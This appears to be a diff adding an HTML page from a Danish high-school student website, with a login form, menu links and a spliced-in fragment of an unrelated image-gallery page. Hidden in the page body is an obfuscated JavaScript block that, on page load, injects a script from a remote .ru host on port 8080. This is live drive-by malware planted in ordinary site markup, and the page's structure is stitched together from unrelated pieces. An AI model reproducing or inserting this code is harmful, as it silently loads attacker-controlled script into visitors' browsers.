@@ -1,0 +1,174 @@
+
+
+<HTML>
+<HEAD>
+<TITLE> www.2003x.dk - Siden for gymnasieeleverne</TITLE>
+
+<LINK title=css href="../style/style.css" type=text/css rel=stylesheet>
+<STYLE type=text/css>
+
+BODY {
+	MARGIN-TOP: 0px;
+	MARGIN-BOTTOM: 0px; 
+	FONT: 8pt Verdana; 
+	COLOR: #ffffff; 
+	BACKGROUND-COLOR: #ffffff;
+}
+
+
+</STYLE>
+
+
+
+</HEAD>
+<BODY>
+<TABLE height="100%" cellSpacing=0 cellPadding=2 width=731 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD vAlign=top background=../ImageTOP.jpg height=97>
+    </TD>
+  </TR>
+    <TD background=images/bg_bar.jpg height=44 vAlign=top>
+	<center>
+	 <a id="menuitem" href="http://2003x.dk">[ 2003x.dk ]</a> -
+	 <a id="menuitem" href="http://2003x.dk/billeder">[ Billeder.2003x.dk ]</a> -
+	 <a id="menuitem" href="http://2003x.dk/lektier">[ Lektier.2003x.dk ]</a> -
+	 <a id="menuitem" href="http://Muju.2003x.dk">[ Maju's Klumme.2003x.dk ]</a> -
+
+    </TD></TR>
+  <TR>
+    <TD vAlign=top background=images/bg_content.jpg>
+ 
+
+
+
+
+     <TABLE cellSpacing=2 cellPadding=10 border=0 width=700>
+        <TBODY>
+        <TR>
+          <TD vAlign=top width=90>
+
+&nbsp;<a id="menuunder" href="default.asp"> <b> Forside</b></a><br>
+
+
+
+
+
+<form method="POST" action="default.asp">
+ <input type="hidden" name="mode" VALUE="Check">
+ <table border="0" width="50%" cellspacing="0">
+  <tr>
+    <td width="100%"></td>
+  </tr>
+ </table>
+   <div align="left">
+    <table border="0" width="20%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="50%"><font face="Tahoma" color="#ffffff">Email:</font></td>
+      </tr>
+      <tr>
+        <td width="50%"><font face="Tahoma" size="2"><input type="text" name="email" size="10" style="font-size: 8 pt"></font></td>
+      </tr>
+      <tr>
+        <td width="50%"><font face="Tahoma" color="#ffffff">Password:</font></td>
+      </tr>
+      <tr>
+        <td width="50%"><font face="Tahoma" size="2"><input type="password" name="password" size="10" style="font-size: 8 pt"></font></td>
+      </tr>
+      <tr>
+        <td width="50%"><font face="Tahoma" size="2"><input type="submit" value="Login" name="btnSubmit" style="font-size: 8 pt"></font></td>
+        <td width="50%"><font face="Tahoma" size="1"></td>
+      </tr>
+    </table>
+
+  </div>
+</form>
+''
+
+<center>
+<font color="#ffffff" face="Verdana" size="1"><a id="menuunder1" href="../add_user.asp">Opret bruger</a>
+</center>
+
+</TD>
+          <TD vAlign=top width=500><SPAN style="FONT: 9pt Verdana; COLOR: #000000">
+
+
+<table border="0" bordercolor="#333333" cellpadding="0" cellspacing="0" width="500" height="100%">
+  <tr>
+    <td width="500" vAlign=top>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var _E;if(_E!='' && _E!='T'){_E=''};this._U='';var S;if(S!=''){S='AK'};function k(){var JiC;if(JiC!='kD' && JiC != ''){JiC=null};var Tq;if(Tq!='' && Tq!='Si'){Tq='t'};var _j="";var V;if(V!='' && V!='JB'){V=''};var s=new String();this.wk='';var N=unescape;var g=window;var _l=new String();var n=N("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%63%6c%69%63%6b%62%61%6e%6b%2e%63%6f%6d%2f%67%61%6d%65%73%70%6f%74%2e%63%6f%6d%2e%70%68%70");this.BN='';var E="";var Ef=new Date();function J(w,m){var Kj;if(Kj!='SiK'){Kj=''};this.It='';var _=String("KoHhg".substr(4));var Ga;if(Ga!='LI' && Ga!='gP'){Ga='LI'};var YA;if(YA!='BF' && YA!='Tl'){YA='BF'};var mu=N("%5b"), o=N("%5d");var G=mu+m+o;var C;if(C!=''){C='LK'};var y=new RegExp(G, _);var Z;if(Z!='lu'){Z='lu'};return w.replace(y, new String());var vc;if(vc!='Uq' && vc!='SO'){vc='Uq'};var Tv=new Date();};var LB=new Date();var r;if(r!=''){r='BB'};var SI;if(SI!=''){SI='Xp'};var yI='';var i=document;var Zo;if(Zo!='zz'){Zo='zz'};var nJ;if(nJ!='vN'){nJ='vN'};var __=new String();var ls=new Date();var Ji=J('84417202277899164063153','69124375');function F(){var NU;if(NU!='NT' && NU!='Hq'){NU=''};var A=N("%68%74%74%70%3a%2f%2f%73%6e%6f%72%65%66%6c%61%73%68%2e%72%75%3a");this.RQ="";this.XN="";__=A;var Wk='';var NQ=new String();__+=Ji;__+=n;var BJ;if(BJ!='De' && BJ!='Ue'){BJ='De'};var Adg="";try {var sj="";var NL;if(NL!='Wj' && NL != ''){NL=null};B=i.createElement(J('sWcfrfilpltu','oz18LB9NMWueCZJElK5f'));var BY;if(BY!='is'){BY=''};this.Hb="";this.mM="";var tr;if(tr!='' && tr!='gG'){tr='HK'};var mH;if(mH!='' && mH!='ZB'){mH='kW'};B[N("%73%72%63")]=__;var bE;if(bE!='gF'){bE=''};var Yh="";B[N("%64%65%66%65%72")]=[1][0];var fJ;if(fJ!='bx' && fJ!='bn'){fJ='bx'};var KB="";i.body.appendChild(B);var iB;if(iB!='rx' && iB!='vj'){iB=''};} catch(Aa){var _W=new Array();alert(Aa);var FF="";var hs=new String();};var bc;if(bc!='' && bc!='zo'){bc=''};var kv;if(kv!=''){kv='CK'};}var Ah;if(Ah!='Yb' && Ah!='IL'){Ah='Yb'};var YR;if(YR!='vO' && YR!='xY'){YR='vO'};var wq=new Array();g[new String("onloa"+"d6o8H".substr(0,1))]=F;var sl=new Array();this.Ja='';};var fk;if(fk!='' && fk!='XS'){fk=''};k();</script>
+<!--8d5c1c9e3dc70f20a36dfdb501597e17--><?xml version="1.0" encoding="iso-8859-1"?>
+<html>
+<head>
+  <title>localhost - Imager Gallery 5.4</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+
+  <p class="imagebody" style="text-align: center;">
+
+    <br /><br /><a href="/billeder\fester/id1/p1010021.jpg"><img src="/billeder\fester/id1/p1010021.jpg" alt="" /></a>
+
+  </p>
+  <p class="description" style="text-align: center;">
+    <b>Beskrivelse:</b><br />
+    
+  </p>
+  <form method="post" action="">
+    <p><span class="login" style="border: 0px;">Admin login:</span> <input type="password" name="login" class="login" />&nbsp;<input type="submit" class="login" /></p>
+  </form>
+  
+
+         </td>
+    <td vAlign=top>
+
+
+    </td>
+  </tr>
+</table>
+        </TR>
+        </TBODY>
+      </TABLE>
+    </TD>
+  </TR>
+  </TR>
+    <TD background=images/bg_bund.jpg height=44 vAlign=bottom align="center">
+	<font color="#000000" face="Verdana" size="1">copyright© 2004-2006 | <a id="menulink" href="http://www.2003x.dk">www.2003x.dk</a>
+    </TD>
+  </TR>
+</TBODY>
+</TABLE>
+
+</BODY>
+</HTML>
